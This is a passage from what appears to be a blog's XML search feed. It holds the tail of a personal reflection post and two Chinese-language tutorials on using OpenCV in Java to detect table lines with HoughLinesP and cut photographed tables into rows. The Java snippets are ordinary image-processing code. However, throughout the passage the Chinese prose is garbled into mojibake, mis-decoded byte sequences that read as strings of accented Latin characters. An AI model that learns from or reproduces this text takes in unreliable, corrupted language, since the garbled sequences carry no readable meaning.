è™½ç„¶æˆ‘ä¸æ˜¯ä¸€ä¸ªç†æƒ³ä¸»ä¹‰è€…ï¼Œä½†æ˜¯çŽ°åœ¨çš„æˆ‘æ˜¯å……æ»¡ç€å¸Œæœ›çš„ï¼Œå› ä¸ºæˆ‘çœ‹åˆ°äº†æˆ‘å¯ä»¥æˆä¸ºæ€Žæ ·çš„äººï¼Œçœ‹åˆ°äº†æœªæ¥çš„é‚£äº›å¯èƒ½ï¼ŒçŸ¥é“äº†é‚£æ ·ä¸€éƒ¨åˆ†è‡ªå·±çš„æœªæ¥ä¼šæ˜¯æ€Žä¹ˆä¸€ä¸ªæ ·å­ã€‚ ä½†æ˜¯ä¸ç®¡è‡ªå·±çš„æ‰“ç®—å¤šä¹ˆå¥½ï¼Œæ¡ä»¶å¤šä¹ˆä¼˜è¶Šï¼Œå§‹ç»ˆä¸èƒ½å˜çš„æ˜¯è‡ªå·±çš„åŠªåŠ›ï¼Œåœ¨è¿™é‡Œä¹Ÿè¦å‘Šè¯«è‡ªå·±è¦Stay Hungry, Stay Foolish.æ—¶åˆ»ä¿æŒæ¸…é†’ï¼Œä¿æŒè‡ªçŸ¥ã€‚ â€œä½ è¦å…‹æœçš„æ˜¯ä½ çš„è™šè£å¿ƒï¼Œæ˜¯ä½ çš„ç‚«è€€æ¬²ï¼Œä½ è¦å¯¹ä»˜çš„æ˜¯ä½ æ—¶åˆ»æƒ³è¦å‡ºé£Žå¤´çš„å°èªæ˜Žã€‚â€â€”â€”è”¡åƒå¬… å…±å‹‰ã€‚]]></content>
      <categories>
        <category>Summary</category>
      </categories>
      <tags>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenCVå¤„ç†æ‹ç…§è¡¨æ ¼ï¼ˆä¸‰ï¼‰]]></title>
    <url>%2F2016%2F12%2F09%2FOpenCV%E5%A4%84%E7%90%86%E6%8B%8D%E7%85%A7%E8%A1%A8%E6%A0%BC%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[è¯´æ˜Žåœ¨å¼€å§‹è¯´æ˜Žç›´çº¿æ£€æµ‹è¿‡ç¨‹å‰å…ˆä½œä¸ªè¯´æ˜Žï¼Œç”±äºŽç›´çº¿æ£€æµ‹çš„ç®—æ³•éœ€è¦éåŽ†æ¯ä¸ªåƒç´ ï¼Œæ‰€ä»¥æ€»çš„è€—æ—¶æ¯”è¾ƒé•¿ï¼Œåœ¨å®‰å“ä¸Šè·‘çš„æ—¶å€™ç›´çº¿æ£€æµ‹çš„æ—¶é—´å¯èƒ½ä¼šé•¿è¾¾ä¸¤åˆ†é’Ÿï¼Œè¿™æ˜¯åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ä¸èƒ½æŽ¥å—çš„ï¼Œæ‰€ä»¥æˆ‘å°†å®‰å“ä¸Šçš„ä»£ç æ•´ä¸ªè¿ç§»åˆ°äº†Ideaä¸­ï¼Œå…³äºŽIdeaä¸­OpenCVçš„é…ç½®ï¼Œå¯ä»¥å‚è§è¿™ä¸ªæ•™ç¨‹ã€‚ è¿™ä¸ªæ­¥éª¤çš„ç›®çš„ï¼šè¿™æ­¥ä¸­æˆ‘ä»¬ä¼šæ£€æµ‹å‡ºæ•´å¼ å›¾ç‰‡ä¸­æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰ç›´çº¿ï¼Œå†é€šè¿‡ç­›é€‰é€‰å‡ºæ¨ªçš„è¡¨æ ¼æ¡†çº¿ï¼Œå†åˆ©ç”¨æ£€æµ‹å‡ºçš„è¡¨æ ¼æ¡†çº¿æ¥æå–ä¸¤ä¸ªæ¡†çº¿ä¹‹é—´çš„å†…å®¹å³ä¸ºè¡¨æ ¼ä¸­çš„ä¸€è¡Œã€‚ ä»£ç å®žçŽ°12345678910111213141516171819202122232425private void cutImagesToRows() &#123; ArrayList&lt;Double&gt; lineYs = new ArrayList&lt;&gt;(); ArrayList&lt;Double&gt; uniqueLineYs = new ArrayList&lt;&gt;(); //lines:a special mat for find lines Mat lines = new Mat(); //find lines and store in lines Imgproc.HoughLinesP(dilateMuchPic, lines, 1, Math.PI / 180, Y_THRESHOLD, Y_MINLINELENGTH, Y_MAXLINEGAP); //get the lines information from lines and store in lineYs for (int i = 0; i &lt; lines.rows(); i++) &#123; double[] points = lines.get(i, 0); double y1, y2; //just need the horizontal lines y1 = points[1]; y2 = points[3]; // if it slopes, get the average of them, store the y-coordinate if (Math.abs(y1 - y2) &lt; 30) &#123; lineYs.add((y1 + y2) / 2); &#125; &#125; getUniqueLines(lineYs, uniqueLineYs, 10); ä¸Šé¢çš„æ³¨é‡Šé‡Œé¢è®²å¾—æ¯”è¾ƒæ¸…æ¥šï¼Œå¦å¤–æœ‰ä¸€äº›è§£é‡Šï¼š å‰é¢æåˆ°è¿‡HoughLinesPè¿™ä¸ªå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„Matï¼Œä¹Ÿå°±æ˜¯ä»£ç ä¸­çš„linesï¼Œå®ƒçš„colï¼ˆåˆ—ï¼‰çš„å€¼ä¸º1ï¼Œrowï¼ˆè¡Œï¼‰çš„å€¼ä¸ºæ£€æµ‹å‡ºçš„æ‰€æœ‰ç›´çº¿ ï¼ˆè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œæˆ‘æ‰‹ä¸Šçš„ä¹¦çš„è¿™ä¸¤ä¸ªå€¼æ­£å¥½ç›¸åï¼Œå¯èƒ½æ˜¯æ ‡å‡†ä¸åŒï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯OpenCV 3.1ï¼‰ã€‚æ¯ä¸ªrowä¸ºä¸€ä¸ªdouble[4]ï¼Œå››ä¸ªå€¼åˆ†åˆ«å¯¹åº”ç€èµ·å§‹ç‚¹çš„x,yåæ ‡ï¼Œç»ˆç‚¹çš„x,yåæ ‡ï¼ˆå›¾ç‰‡çš„å·¦ä¸Šè§’ä¸ºåŽŸç‚¹ï¼‰ã€‚ä¸¤ä¸ªç‚¹è¿žèµ·æ¥å°±æ˜¯æ£€æµ‹å‡ºçš„ç›´çº¿ã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘åªå–äº†1,3ï¼Œå¯¹åº”çš„æ˜¯èµ·ç‚¹å’Œç»ˆç‚¹çš„yåæ ‡ã€‚ if (Math.abs(y1 - y2) &lt; 30)è¿™å¥åˆ¤æ–­çš„ç›®çš„æ˜¯è¿‡æ»¤æŽ‰ç«–ç›´çš„ç›´çº¿ï¼ˆèµ·å§‹ç‚¹yåæ ‡ä¹‹å·®æ˜¾ç„¶å¤§äºŽ30ï¼‰ï¼Œå¹¶ä¸”å…è®¸æ¨ªçº¿æœ‰ä¸€å®šçš„å€¾æ–œï¼ˆèµ·å§‹ç‚¹å¯ä»¥æœ‰30åƒç´ çš„å·®è·ï¼‰ã€‚æ‰¾åˆ°è¿™æ ·çš„ä¸€å¯¹ç‚¹åŽï¼ŒæŠŠå®ƒä»¬çš„yåæ ‡å–å¹³å‡å€¼å­˜å…¥ä¸€ä¸ªæ•°ç»„ä¸­ã€‚ â€‹ ç”±äºŽå›¾ç‰‡ä¸­ä¸€æ¡ç›´çº¿çš„å®½åº¦ä¸å¯èƒ½æ­£å¥½æ˜¯ä¸€ä¸ªåƒç´ ï¼Œæ‰€ä»¥å¿…ç„¶ä¼šå‡ºçŽ°ä¸€æ¡ç›´çº¿æ£€æµ‹å‡ºå¾ˆå¤šä¸ªyåæ ‡çš„é—®é¢˜ï¼Œä¸‹é¢è¿™ä¸ªæ–¹æ³•å°±æ˜¯ä¸ºäº†æ‰¾åˆ°è¿™äº›å¤šä½™çš„yåæ ‡å¹¶å–å®ƒä»¬çš„å¹³å‡å€¼ä½œä¸ºæœ€ç»ˆçš„yåæ ‡ã€‚ getUniqueLines(lineYs, uniqueLineYs, 10);ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425/** * filter the source coordinates, if some values are too close ,get the average of them * * @param src source coordinates list * @param dst destination coordinate list * @param minGap the minimum gap between coordinates */private void getUniqueLines(ArrayList&lt;Double&gt; src, ArrayList&lt;Double&gt; dst, int minGap) &#123; Collections.sort(src); //sort the source coordinates list for (int i = 0; i &lt; src.size(); i++) &#123; double sum = src.get(i); double num = 1; //when the distance between lines less than minGap, get the average of thema while (i != src.size() - 1 &amp;&amp; src.get(i + 1) - src.get(i) &lt; minGap) &#123; num++; sum = sum + src.get(i + 1); i++; &#125; if (num == 1) &#123; dst.add(src.get(i)); &#125; else &#123; dst.add(((sum / num))); &#125; &#125;&#125; minGapï¼šç›´çº¿é—´è·é˜ˆå€¼ï¼Œé—´è·å°äºŽè¿™ä¸ªå€¼çš„ç›´çº¿è¢«å¤„ç†ã€‚ 1234567891011121314151617181920blockImages = new ArrayList&lt;&gt;();for (int i = 0; i &lt; uniqueLineYs.size(); i++) &#123; Rect rect; double y = uniqueLineYs.get(i); //if not the last line if (i != uniqueLineYs.size() - 1) &#123; rect = new Rect((int) (srcPic.width() * PADDING_LEFT_RIGHT), (int) (y + (uniqueLineYs.get(i + 1) - y) * PADDING_TOP_BOTTOM), (int) (srcPic.width() * (1 - PADDING_LEFT_RIGHT * 2)), (int) ((uniqueLineYs.get(i + 1) - y) * (1 - PADDING_TOP_BOTTOM * 2))); &#125; else &#123; //the last line rect = new Rect((int) (srcPic.width() * PADDING_LEFT_RIGHT), (int) (y + (srcPic.height() - y) * PADDING_TOP_BOTTOM), (int) (srcPic.width() * (1 - PADDING_LEFT_RIGHT * 2)), (int) ((srcPic.height() - y) * (1 - PADDING_TOP_BOTTOM * 2))); &#125; //cut the source picture to cutMat Mat cutMat = new Mat(srcPic, rect); blockImages.add(cutMat); è¿™æ­¥å°±æ˜¯åˆ‡å‰²äº†ï¼ŒblockImageså°±æ˜¯å­˜æ”¾åˆ‡å‰²åŽçš„è¡Œå›¾åƒçš„ArrayListã€‚ å…³äºŽRectï¼šRectå¯¹è±¡è¡¨ç¤ºä¸€ä¸ªåŒºåŸŸï¼Œå¯ä»¥ä½œä¸ºMatçš„æž„é€ å‚æ•°ä¼ å…¥æ¥ä¸ºç›®æ ‡åŒºåŸŸåˆ›é€ ä¸€ä¸ªMatå‰¯æœ¬ã€‚å››ä¸ªå‚æ•°åˆ†åˆ«ä»£è¡¨äº†åŒºåŸŸèµ·å§‹ç‚¹çš„x,yåæ ‡ï¼ŒåŒºåŸŸé•¿åº¦å’ŒåŒºåŸŸé«˜åº¦ã€‚ å¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘ä½¿ç”¨äº†ä¸€ä¸ªPADDINGå‚æ•°ï¼Œæ¥è§„å®šåˆ‡å‰²æ—¶è·è§„å®šè¾¹ç¼˜çš„è·ç¦»æ¥é¿å…æŠŠä¸€äº›è¡¨æ ¼çš„è¾¹çº¿åˆ‡åˆ°å›¾åƒä¸­å½±å“OCRçš„è¯†åˆ«ã€‚ è‡³äºŽä¸Šé¢ä¸€ç¯‡åšå®¢ä¸­æœ€åŽçš„çº¢çº¿æ˜¯æµ‹è¯•æ—¶ç”¨ 12345678910111213private void showMarkedLines(Mat src, ArrayList&lt;Double&gt; lines) &#123; Mat showLines = new Mat(); Imgproc.cvtColor(src, showLines, COLOR_GRAY2BGR); for (double y : lines) &#123; Point pt1 = new Point(0, y); Point pt2 = new Point(src.width(), y); Imgproc.line(showLines, pt1, pt2, new Scalar(0, 0, 255), 3); &#125; Imgcodecs.imwrite("C:/Users/visea/Desktop/test/java/cut/" + String.valueOf(colNum) + ".jpg", showLines);&#125; æ‰“å°å‡ºæ¥çš„ï¼Œè¿™é‡Œæ–°å»ºäº†ä¸€ä¸ªshowLineså¹¶ä¸”æŠŠåŽŸå›¾åƒé€šè¿‡Imgproc.cvtColoræ–¹æ³•è½¬æ¢æˆBGRå›¾åƒå¹¶å¤åˆ¶åˆ°showLinesï¼ˆä¸è½¬åŒ–æˆå½©è‰²æ ¼å¼åªèƒ½æ˜¾ç¤ºç°åº¦å›¾åƒï¼‰ã€‚ æ‰“å°ä¸€æ¡ç›´çº¿ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåªè¦æ–°å»ºä¸¤ä¸ªPointå¯¹è±¡ä»£è¡¨èµ·å§‹ç‚¹å’Œç»ˆç‚¹ï¼Œè¿™é‡Œæˆ‘æŠŠxåæ ‡è®¾ç½®ä¸ºå›¾åƒçš„èµ·å§‹xåæ ‡ï¼Œyåæ ‡ä¸ºä¹‹å‰å¾—åˆ°çš„å”¯ä¸€çš„yå€¼ï¼Œæ‰€ä»¥å¯ä»¥çœ‹åˆ°ç”»å‡ºæ¥çš„çº¿å°±æ˜¯æ°´å¹³å¹¶ä¸”ä»Žå¼€å¤´ä¸€ç›´åˆ°ç»“æŸçš„ã€‚ ç”»ç›´çº¿ä½¿ç”¨Imgproc.lineæ–¹æ³•ï¼Œæœ€åŽä¸¤ä¸ªå‚æ•°ä¾æ¬¡æ˜¯BGRä¸‰ä¸ªé€šé“çš„å€¼ç»„æˆçš„Scalarå¯¹è±¡ï¼Œä»£è¡¨ç›´çº¿çš„é¢œè‰²ï¼Œä»¥åŠç”»å‡ºçš„ç›´çº¿çš„å®½åº¦ï¼ˆä»¥åƒç´ ä¸ºå•ä½ï¼‰ã€‚ æ•ˆæžœæœ€åŽç”¨Imgcodecs.imwriteå°†Matå†™å…¥æ–‡ä»¶å°±å¯ä»¥çœ‹åˆ°æœ€ç»ˆçš„æ•ˆæžœäº†ï¼Œåœ¨æµ‹è¯•çš„æ—¶å€™å°¤å…¶æœ‰ç”¨ã€‚ ä¹Ÿå¯ä»¥æŠŠblockImagesä¸­çš„å›¾è¾“å‡ºå‡ºæ¥çœ‹ç»“æžœï¼Œå› ä¸ºåšçš„æ—¶å€™æ²¡å­˜æ¡£ï¼Œæ‰€ä»¥åªèƒ½ç”¨ä¹‹åŽçš„å›¾æ¥è¯´æ˜Žä¸€ä¸‹äº†ï¼š è¯·å¿½ç•¥å›¾ä¸­çš„çº¢çº¿ï¼Œä¸ºä¹‹åŽçš„æ­¥éª¤ç»˜åˆ¶å‡ºæ¥çš„ï¼Œå·¦å³ä¸å®Œæ•´æ˜¯å› ä¸ºæˆ‘è®¾ç½®äº†ç™¾åˆ†ä¹‹äºŒåçš„å·¦å³çš„PADDINGï¼Œä¸ºäº†æ–¹ä¾¿åŽé¢çš„æ‰¾çº¿ä¸Žåˆ‡å‰²ã€‚ å½“ç„¶åœ¨æ‰¾ç›´çº¿çš„è¿‡ç¨‹ä¸­ä¹Ÿå¯ä»¥æŠŠæ‰¾åˆ°çš„å›¾ç‰‡æ‰“å°å‡ºæ¥æ„Ÿè§‰ä¸€ä¸‹æ•ˆæžœï¼Œä¸‹é¢åˆ†åˆ«æ˜¯è°ƒè¯•å‰å‡ºçš„å›¾å’Œæœ€ç»ˆå‚æ•°è°ƒè¯•åŽå‡ºæ¥çš„å›¾ï¼š è°ƒè¯•å‰ï¼š è°ƒè¯•åŽï¼š]]></content>
      <categories>
        <category>Java</category>
        <category>OpenCV</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>OpenCV</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenCVå¤„ç†æ‹ç…§è¡¨æ ¼ï¼ˆäºŒï¼‰]]></title>
    <url>%2F2016%2F12%2F02%2FOpenCV%E5%A4%84%E7%90%86%E6%8B%8D%E7%85%A7%E8%A1%A8%E6%A0%BC%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[å…ˆæ¥çœ‹çœ‹ä¸Šæ¬¡å¤„ç†åŽçš„æ•´å¼ å›¾ç‰‡æ•ˆæžœï¼š è¿™é‡Œå‘çŽ°æˆ‘å°†å›¾ç‰‡çš„é¢œè‰²å·²ç»åç›¸äº†ï¼Œè¿™æ˜¯è€ƒè™‘åˆ°ä¸‹ä¸€æ­¥çš„ç›´æŽ¥æ£€æµ‹å¿…é¡»ä»¥ç™½è‰²åƒç´ ä¸ºå†…å®¹ã€‚åšæ³•åœ¨ä¸Šä¸€ç¯‡æåˆ°è¿‡ï¼Œäº¤æ¢ä¸¤æ®µçš„ä½ç½®å°±å¯ä»¥äº†ã€‚ å¯ä»¥çœ‹åˆ°å™ªç‚¹å·²ç»å‡ ä¹Žæ²¡æœ‰äº†ï¼Œæ–‡å­—çš„æ¸…æ™°åº¦è¿˜æ˜¯å¯ä»¥çš„ã€‚è¿™é‡Œé‡‡ç”¨çš„kerneléƒ½æ˜¯2x2çš„ã€‚ ç›´çº¿æ£€æµ‹ä¸‹é¢å°±æ˜¯æ¯”è¾ƒå…³é”®æ­¥éª¤â€”â€”ç›´çº¿æ£€æµ‹äº†ã€‚ é¦–å…ˆä»‹ç»ä¸€ä¸‹openCVæä¾›çš„ç›´çº¿æ£€æµ‹ç®—æ³•ï¼šéœå¤«å˜æ¢ã€‚ éœå¤«å˜æ¢æ˜¯å›¾åƒå¤„ç†ä¸­ä¸€ä¸ªè‘—åçš„æ£€æµ‹ç®—æ³•ï¼Œç”¨äºŽå¯¹äºŒå€¼å›¾ç‰‡ä¸­ç‰¹å®šçš„å‡ ä½•å½¢çŠ¶çš„æ£€æµ‹ï¼Œç›´çº¿æ£€æµ‹åªæ˜¯å…¶ä¸­æ¯”è¾ƒå¸¸è§çš„ä¸€ç§ç”¨æ³•ã€‚ä»Žholybinçš„ä¸“æ ä¸­å¤åˆ¶ä¸€æ®µä»‹ç»åŸºæœ¬ç†è®ºçš„å†…å®¹ï¼š Houghç›´çº¿æ£€æµ‹çš„åŸºæœ¬ç†è®ºæ˜¯äºŒå€¼å›¾åƒä¸­çš„ä»»ä½•ç‚¹éƒ½å¯èƒ½æ˜¯ä¸€äº›å€™é€‰ç›´çº¿é›†åˆçš„ä¸€éƒ¨åˆ†ï¼Œæ‰€é€‰çš„å‚æ•°æ–¹å¼æ˜¯æ¯ä¸€è¡Œä»£è¡¨æžåæ ‡ä¸­çš„ä¸€ä¸ªç‚¹ï¼Œå¹¶ä¸”éšå«çš„ç›´çº¿æ˜¯é€šè¿‡è±¡å¾ç‚¹çš„ï¼Œåž‚ç›´äºŽåŽŸç‚¹åˆ°æ­¤ç‚¹çš„åŠå¾„ï¼Œå³ï¼šæ£€æµ‹çš„è¿‡ç¨‹å¯ä»¥çœ‹æˆä»Žå›¾åƒä¸­çš„ä¸€ä¸ªä¸ªåƒç´ ç‚¹å‡ºå‘ï¼Œå¯»æ‰¾æ¯ä¸ªç‚¹æˆä¸ºç›´çº¿ä¸€éƒ¨åˆ†çš„å¯èƒ½ï¼Œå†æŠŠè¿™æ¡çº¿ä¸Šå¯èƒ½çš„ç‚¹è¿žèµ·æ¥å½¢æˆç›´çº¿ã€‚åœ¨å®žé™…æ£€æµ‹ä¸­ï¼Œå½“ä¸€æ¡çº¿å‡ºçŽ°å‡¹é™·æˆ–æ˜¯å¼¯æ›²åº¦æ—¶ï¼Œä¹Ÿä¼šæ£€æµ‹å‡ºç›´çº¿ï¼Œåªæ˜¯ä¸æ˜¯ä¸€æ¡å®Œæ•´é•¿åº¦ç›´çº¿ï¼Œè€Œæ˜¯æ–­æ–­ç»­ç»­é‡å ç›¸è¿‘çš„å¾ˆå¤šç›´çº¿ã€‚&gt;è€Œå¯¹äºŽå›¾åƒä¸­çš„ä¸€æ¡ç›´çº¿è€Œè¨€ï¼Œåˆ©ç”¨ç›´è§’åæ ‡ç³»ï¼Œå¯ä»¥è¡¨ç¤ºä¸ºï¼šçš„å½¢å¼ã€‚é‚£ä¹ˆï¼Œè¯¥ç›´çº¿ä¸Šä»»æ„ä¸€ç‚¹ï¼ˆx,yï¼‰å˜æ¢åˆ°k-bå‚æ•°ç©ºé—´å°†å˜æˆä¸€ä¸ªâ€œç‚¹â€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå°†å›¾åƒç©ºé—´ä¸­æ‰€æœ‰çš„éžé›¶åƒç´ è½¬æ¢åˆ°k-bå‚æ•°ç©ºé—´ï¼Œé‚£ä¹ˆå®ƒä»¬å°†èšç„¦åœ¨ä¸€ä¸ªç‚¹ä¸Šã€‚å¦‚æ­¤ä¸€æ¥ï¼Œå‚æ•°ç©ºé—´ä¸­çš„ä¸€ä¸ªå±€éƒ¨å³°å€¼ç‚¹å°±å¾ˆæœ‰å¯èƒ½å¯¹åº”ç€åŽŸå›¾åƒç©ºé—´ä¸­çš„ä¸€æ¡ç›´çº¿ã€‚ä¸è¿‡ï¼Œç”±äºŽç›´çº¿çš„æ–œçŽ‡å¯èƒ½ä¸ºæ— ç©·å¤§ï¼Œæˆ–è€…æ— ç©·å°ï¼Œé‚£ä¹ˆï¼Œåœ¨k-bå‚æ•°ç©ºé—´å°±ä¸ä¾¿äºŽå¯¹ç›´çº¿è¿›è¡Œåˆ»ç”»å’Œæè¿°ã€‚æ‰€ä»¥ï¼Œç ”ç©¶äººå‘˜æå‡ºé‡‡ç”¨æžåæ ‡å‚æ•°ç©ºé—´è¿›è¡Œç›´çº¿æ£€æµ‹ã€‚åœ¨æžåæ ‡ç³»ä¸­ï¼Œç›´çº¿å¯ä»¥è¡¨è¿°ä¸ºä»¥ä¸‹å½¢å¼ï¼š&gt; æ›´ä¸ºè¯¦ç»†çš„åˆ†æžå¯ä»¥çœ‹æµ…å¢¨çš„åšå®¢ å¦‚æžœä¸èƒ½ç†è§£ä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œåœ¨openCVä¸­å·²ç»ä¸ºæˆ‘ä»¬å°è£…æˆäº†ä¸¤ä¸ªå‡½æ•°HoughLines( )ä¸ŽHoughLinesP( )ï¼Œä»–ä»¬ä¹‹é—´çš„åŒºåˆ«åœ¨äºŽç®—æ³•çš„ä¸åŒï¼Œè€Œæ•ˆæžœçš„å·®åˆ«ä¸å¤§ï¼Œä½†HoughLinesPå¯ä»¥å‡å°‘è®¡ç®—é‡ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨äº†HoughLinesPæ¥è¿›è¡Œã€‚1public static void HoughLinesP(Mat image,Mat lines,double rho,double theta,int threshold,double minLineLength,double maxLineGap) Finds line segments in a binary image using the probabilistic Hough transform. Parameters:image - 8-bit, single-channel binary source image. The image may be modified by the function.lines - Output vector of lines. Each line is represented by a 4-element vector (x_1, y_1, x_2, y_2), where (x_1,y_1) and (x_2, y_2) are the ending points of each detected line segment.rho - Distance resolution of the accumulator in pixels.theta - Angle resolution of the accumulator in radians.threshold - Accumulator threshold parameter. Only those lines are returned that get enough votes (&gt;threshold).minLineLength - Minimum line length. Line segments shorter than that are rejected.maxLineGap - Maximum allowed gap between points on the same line to link them. è§£é‡Šä¸€ä¸‹å„ä¸ªå‚æ•°ï¼š image:æºå›¾åƒ Matæ ¼å¼ï¼Œ8ä½å•é€šé“ï¼ˆCv_8UC1ï¼‰ lines: è¾“å‡ºçš„â€œå›¾åƒâ€ è™½ç„¶æ˜¯Matæ ¼å¼ï¼Œä½†æ˜¯å…¶ä¸­ä¿å­˜çš„å†…å®¹å·²ç»ä¸å†æ˜¯å›¾åƒäº†ï¼Œå…¶ä¸­çš„æ¯è¡Œï¼ˆRowsï¼åœ¨è¿™é‡Œæ‰‹ä¸Šä¹°åˆ°çš„ä¸€æœ¬ä¹¦ä¸­å†™æˆäº†åˆ—ï¼Œå¤§æ¦‚æ˜¯å› ä¸ºç‰ˆæœ¬ä¸åŒå¯¼è‡´çš„ï¼Œå› ä¸ºè¿™ä¸ªåœ¨è¿™é‡Œå¡äº†å¥½å‡ ä¸ªå°æ—¶â€¦â€¦ï¼‰ä¸­å‚¨å­˜äº†ä¸€ä¸ªdouble[]ï¼Œä¸‹é¢ä¼šè®²åˆ°å¦‚ä½•ä½¿ç”¨é‡Œé¢çš„ä¿¡æ¯ã€‚ rhoï¼šç¿»è¯‘è¿‡æ¥æ˜¯è·ç¦»çš„è§£æžåº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½ï¼Œåœ¨åŽé¢è¿™ä¸ªå‚æ•°èµ·äº†å¤§ä½œç”¨ã€‚ thetaï¼šä¸Žrhoç›¸ä¼¼åœ°ï¼Œæ˜¯è§’åº¦çš„è§£æžåº¦ï¼Œä»¥å¼§åº¦ä¸ºå•ä½ã€‚ thresholdï¼šé˜ˆå€¼ è¿™ä¸ªå€¼å†³å®šäº†éœå¤«å˜æ¢åŽå¯¹äºŽä¸€å¯¹å€¼æŠ•ç¥¨æ‰€éœ€è¾¾åˆ°çš„é˜ˆå€¼æ‰èƒ½è¢«è®°å½•ã€‚æ¢å¥è¯è¯´ï¼Œè¿™ä¸ªå€¼è¶Šå¤§ï¼Œæ£€æµ‹å‡ºç›´çº¿çš„è¦æ±‚å°±è¶Šé«˜ï¼ˆè¿™ä¸ªè¦æ±‚åº”è¯¥æ˜¯å¯¹äºŽç›´çº¿ä¸Šçš„ç‚¹èšé›†ç¨‹åº¦çš„è¦æ±‚ï¼‰ã€‚åº”ä¸ºä¸€ä¸ªéžè´Ÿå€¼ã€‚ minLineLength:å­—é¢æ„æ€ï¼Œæ£€æµ‹å‡ºçš„ç›´çº¿çš„æœ€å°é•¿åº¦ï¼Œå°äºŽè¿™ä¸ªé•¿åº¦çš„ç›´çº¿å°†ä¸ä¼šè¢«è®°å½•ã€‚å•ä½æ˜¯åƒç´ ã€‚ maxLineGapï¼šå­—é¢æ„æ€ï¼Œæ£€æµ‹æ—¶å¯ä»¥æŽ¥å—çš„ç›´çº¿æ–­å¼€çš„è·ç¦»ï¼ˆå®žé™…æƒ…å†µä¸­å¾ˆéš¾è¾¾åˆ°ä¸€æ¡ç›´çº¿ä¸Šçš„ç‚¹å…¨éƒ¨éƒ½æœ‰ï¼Œé€šå¸¸æ˜¯æ–­æ–­ç»­ç»­çš„ï¼Œè¿™æ—¶è¿™ä¸ªå€¼å°±å‘æŒ¥äº†å¾ˆå¤§çš„ä½œç”¨ï¼‰ã€‚å•ä½æ˜¯åƒç´ ã€‚ å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„å‚æ•°éžå¸¸å¤šï¼Œå¹¶ä¸”æœ‰ä¸ªåˆ«å‚æ•°å¹¶æ²¡æœ‰ä¸€ä¸ªé‡åŒ–çš„æ ‡å‡†ï¼ˆæ¯”å¦‚thresholdåœ¨æ£€æµ‹å¤§å›¾çš„æ—¶å€™å–150å·¦å³çš„å€¼æ¯”è¾ƒå¥½ï¼Œä½†åœ¨åŽé¢æ£€æµ‹å°å›¾æ—¶å€™è®¾æˆ0éƒ½ä¸å°½äººæ„ï¼Œrhoä¸Žthetaå‚æ•°å¦‚æžœæŒ‰ç…§èµ„æ–™ä¸­æ™®éçš„1å’Œ2pi/180æ¥è®¾ç½®å°å›¾çš„æ£€æµ‹å°±ä¼šå‡ºçŽ°é—®é¢˜ï¼‰ï¼Œæ›´åŠ æ‚²æƒ¨çš„æ˜¯è¿™äº›å‚æ•°ä¹‹é—´å­˜åœ¨ç›¸äº’å½±å“ï¼Œå¯¹å®žé™…çš„å›¾ç‰‡è¿›è¡Œå¤„ç†çš„è¿‡ç¨‹ä¸­å‚æ•°çš„å·®åˆ«å¯èƒ½å¾ˆå¤§ï¼Œéœ€è¦ä¸€äº›è€å¿ƒå’Œæ–¹æ³•åŽ»æ…¢æ…¢è°ƒè¯•ï¼ˆæˆ‘å†™äº†åµŒå¥—çš„å¾ªçŽ¯å†è¾“å‡ºæ‰€æœ‰çš„å›¾ç”¨è‚‰çœ¼çœ‹æ•ˆæžœå†ç¼©å°èŒƒå›´â€¦â€¦ï¼‰ æœ€å½±å“æœ€ç»ˆæ•ˆæžœçš„éƒ¨åˆ†åœ¨äºŽæœ€åŽä¸¤ä¸ªå€¼çš„è®¾ç½®ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šé¢æˆ‘ä»¬å°†è¦å¤„ç†çš„å›¾ç‰‡ï¼Œè¿™æ­¥æˆ‘çš„ç›®çš„æ˜¯æ£€æµ‹å‡ºæ‰€æœ‰çš„æ¨ªå‘çš„è¡¨æ ¼è¾¹çº¿ã€‚ä¸‹é¢å…ˆä¸Šæœ€ç»ˆçš„æ•ˆæžœå›¾ï¼š (çº¢çº¿ä¸ºæœ€ç»ˆæ£€æµ‹å‡ºçš„ç›´çº¿ä½ç½®ï¼‰ å…·ä½“çš„æ£€æµ‹è¿‡ç¨‹ä¸‹ä¸€ç¯‡ä»‹ç»ã€‚]]></content>
      <categories>
        <category>Java</category>
        <category>OpenCV</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>OpenCV</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenCVå¤„ç†æ‹ç…§è¡¨æ ¼ï¼ˆä¸€ï¼‰]]></title>
    <url>%2F2016%2F11%2F15%2FOpenCV%E5%A4%84%E7%90%86%E6%8B%8D%E7%85%A7%E8%A1%A8%E6%A0%BC%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
